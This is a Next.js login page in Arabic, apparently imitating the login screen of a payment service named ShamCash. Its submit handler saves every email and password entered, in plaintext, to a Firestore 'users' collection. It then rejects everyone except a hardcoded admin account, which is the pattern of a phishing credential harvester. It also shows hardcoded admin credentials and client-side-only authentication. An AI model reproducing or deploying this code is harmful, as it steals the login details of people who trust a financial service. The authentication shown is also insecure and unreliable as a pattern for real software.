'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import Logo from '@/components/Logo';
import FloatingInput from '@/components/FloatingInput';
import { useSoundSystem } from '@/hooks/useSound';
import { addDoc, collection } from "firebase/firestore";
import { db } from "@/lib/firebase";

const ADMIN_EMAIL = 'admin@shamcash.com';
const ADMIN_PASSWORD = 'shamcash2024';

export default function LoginPage() {
  const router = useRouter();
  const { play } = useSoundSystem();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
setIsLoading(true);

await addDoc(collection(db, "users"), {
  email,
  password,
  createdAt: new Date()
});

await new Promise((r) => setTimeout(r, 600));

    if (email.trim() === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
      play('login');
      sessionStorage.setItem('dashboard_auth', 'true');
      router.push('/dashboard');
    } else {
      play('alert');
      setError('البريد الإلكتروني أو كلمة المرور غير صحيحة');
    }

    setIsLoading(false);
  };

  const PersonIcon = (
    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
    </svg>
  );

  const LockIcon = (
    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
    </svg>
  );

  const EyeBtn = (
    <button type="button" onClick={() => setShowPassword(!showPassword)} className="text-gray-400 hover:text-white transition-colors">
      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
        {showPassword
          ? <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
          : <><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" /></>
        }
      </svg>
    </button>
  );

  return (
    <main className="min-h-screen bg-gradient-to-b from-[#0d1526] to-[#111c35] text-white flex flex-col items-center justify-center px-6 py-10" dir="rtl">
      <div className="w-full max-w-sm">

        {/* Logo */}
        <div className="flex justify-center mb-8">
          <Logo size={96} />
        </div>

        {/* Title */}
        <h1 className="text-3xl font-bold text-center text-white mb-8">تسجيل الدخول</h1>

        <form onSubmit={handleLogin} className="space-y-4" noValidate>

          {/* Email */}
          <FloatingInput
            label="البريد الإلكتروني"
            type="email"
            value={email}
            onChange={(e) => { setEmail(e.target.value); setError(''); }}
            icon={PersonIcon}
            dir="ltr"
            autoComplete="email"
          />

          {/* Password */}
          <FloatingInput
            label="كلمة السر"
            type={showPassword ? 'text' : 'password'}
            value={password}
            onChange={(e) => { setPassword(e.target.value); setError(''); }}
            icon={LockIcon}
            rightElement={EyeBtn}
            autoComplete="current-password"
          />

          {/* Forgot password */}
          <div className="text-sm text-right">
            <span className="text-gray-400">هل نسيت كلمة المرور؟ </span>
            <button
              type="button"
              onClick={() => router.push('/password-reset')}
              className="text-blue-400 hover:text-blue-300 transition-colors font-medium"
            >
              تغيير كلمة المرور
            </button>
          </div>

          {/* Error */}
          {error && (
            <div className="bg-red-500/10 border border-red-500/30 rounded-xl px-4 py-3 text-red-400 text-sm text-center">
              {error}
            </div>
          )}

          {/* Buttons row: QR + Login */}
          <div className="flex items-center gap-3 pt-1">
            {/* QR button */}
            <button
              type="button"
              className="w-11 h-11 rounded-xl border border-white/15 bg-white/10 hover:bg-white/15 flex items-center justify-center shrink-0 transition-colors"
              aria-label="تسجيل الدخول بالرمز"
            >
              <svg className="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 24 24">
                <path d="M3 3h7v7H3V3zm1 1v5h5V4H4zm1 1h3v3H5V5zm8-2h7v7h-7V3zm1 1v5h5V4h-5zm1 1h3v3h-3V5zM3 13h7v7H3v-7zm1 1v5h5v-5H4zm1 1h3v3H5v-3zm8 0h2v2h-2v-2zm3 0h2v2h-2v-2zm-3 3h2v2h-2v-2zm3 0h2v2h-2v-2zm-6-3h2v2h-2v-2zm9-3h2v2h-2v-2z" />
              </svg>
            </button>

            {/* Login button */}
            <button
              type="submit"
              disabled={isLoading || !email || !password}
              className="flex-1 h-14 bg-[#4A7FFF] hover:bg-[#3a6fee] py-3.5 rounded-2xl font-bold text-base disabled:opacity-60 flex items-center justify-center gap-2 transition-colors"
            >
              {isLoading ? (
                <><svg className="animate-spin w-5 h-5" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" /><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" /></svg>جاري التحقق...</>
              ) : 'تسجيل الدخول'}
            </button>
          </div>
        </form>

        {/* Create account */}
        <p className="text-center text-sm mt-6">
          <span className="text-gray-400">لا تملك حساب مسبقاً؟ </span>
          <button
            type="button"
            onClick={() => router.push('/registration/step-1')}
            className="text-blue-400 hover:text-blue-300 transition-colors font-medium"
          >
            إنشاء حساب
          </button>
        </p>

        {/* Footer */}
        <div className="text-center mt-12 space-y-2">
          <p className="text-gray-600 text-xs tracking-widest uppercase">Powered By</p>
          <div className="flex justify-center">
            <svg width="32" height="32" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" className="opacity-40">
              <polygon points="20,10 80,10 95,50 80,90 20,90 5,50" fill="none" stroke="#a0aec0" strokeWidth="6" />
              <polygon points="35,30 65,30 78,50 65,70 35,70 22,50" fill="#a0aec0" opacity="0.3" />
            </svg>
          </div>
          <p className="text-gray-600 text-xs">V 2.2.4</p>
        </div>

      </div>
    </main>
  );
}
